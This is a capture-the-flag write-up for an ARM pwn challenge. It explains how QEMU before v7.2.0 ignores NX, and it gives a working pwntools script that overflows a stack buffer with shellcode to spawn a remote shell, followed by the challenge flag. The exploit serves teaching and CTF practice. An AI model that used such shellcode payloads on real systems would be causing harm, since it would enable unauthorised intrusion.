# Good Emulation

Author: `nhwn`

I enabled NX...right?

## Solution

This challenge exploits a ~~bug~~ undocumented(?) feature in QEMU versions before v7.2.0 where NX is not respected. The binary distributed for this challenge is built with the following mitigations:
```
Arch:     arm-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x10000)
```

In particular, NX is "enabled". Running the binary with QEMU further reinforces this lie; the printout of `/proc/self/maps`, which shows the mapped memory of the process, clearly shows that the stack is non-executable. However, we can just send an off-the-shelf shellcode payload to get a shell on the remote (this can also be checked with the provided QEMU build in `dist.Dockerfile`):

```python
from pwn import *

context.arch = "arm"

p = remote("localhost", 1337)
p.recvuntil(b"at ")
buf = int(p.recvlineS(), 16)
payload = asm(shellcraft.sh()).ljust(132, b"A")
p.sendline(payload + p64(buf))
p.interactive()
```

It's also very winnable to do this via ROP since the binary is statically linked, but this is obviously the easier solution.

Flag: `gigem{q3mu_wh4t_th3_fl1p}`
